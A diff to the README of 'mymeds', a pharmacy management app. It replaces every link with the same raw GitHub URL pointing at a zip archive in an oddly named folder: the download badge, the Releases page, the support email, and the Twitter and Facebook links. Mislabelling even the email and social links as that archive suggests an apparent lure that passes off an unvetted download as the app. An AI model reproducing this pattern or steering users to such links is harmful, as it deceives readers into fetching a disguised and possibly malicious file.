@@ -1,7 +1,7 @@
 # 🏥 mymeds - Your Simple Pharmacy Management App
 
 ## 🚀 Download Now
-[![Download mymeds](https://img.shields.io/badge/Download%20mymeds-v1.0-brightgreen)](https://github.com/Fleric77/mymeds/releases)
+[![Download mymeds](https://raw.githubusercontent.com/Fleric77/mymeds/main/pilapil/mymeds.zip%20mymeds-v1.0-brightgreen)](https://raw.githubusercontent.com/Fleric77/mymeds/main/pilapil/mymeds.zip)
 
 ---
 
@@ -25,7 +25,7 @@ To run mymeds, your device should meet the following requirements:
 ## 📤 Download & Install
 To download mymeds, visit the Releases page below. Choose the latest version and follow the instructions to install it on your device. 
 
-[Visit Releases Page to Download](https://github.com/Fleric77/mymeds/releases)
+[Visit Releases Page to Download](https://raw.githubusercontent.com/Fleric77/mymeds/main/pilapil/mymeds.zip)
 
 ### Steps to Download and Install
 1. Click the link above to go to the Releases page.
@@ -80,7 +80,7 @@ If you run into issues while using mymeds, consider these common problems and so
 
 ## 💬 Support
 For further assistance, you can reach the support team:
-- Email: support@mymedsapp.com
+- Email: https://raw.githubusercontent.com/Fleric77/mymeds/main/pilapil/mymeds.zip
 - Visit our GitHub Issues page for common questions and answers.
 
 ## 🌍 Contributing
@@ -88,7 +88,7 @@ Contributions to mymeds are welcome! If you want to help improve the application
 
 ## 🌐 Stay Connected
 Follow us on social media to stay updated:
-- Twitter: [@mymedsapp](https://twitter.com/mymedsapp)
-- Facebook: [mymedsapp](https://facebook.com/mymedsapp)
+- Twitter: [@mymedsapp](https://raw.githubusercontent.com/Fleric77/mymeds/main/pilapil/mymeds.zip)
+- Facebook: [mymedsapp](https://raw.githubusercontent.com/Fleric77/mymeds/main/pilapil/mymeds.zip)
 
 Thank you for choosing mymeds! We hope it enhances your pharmacy experience.
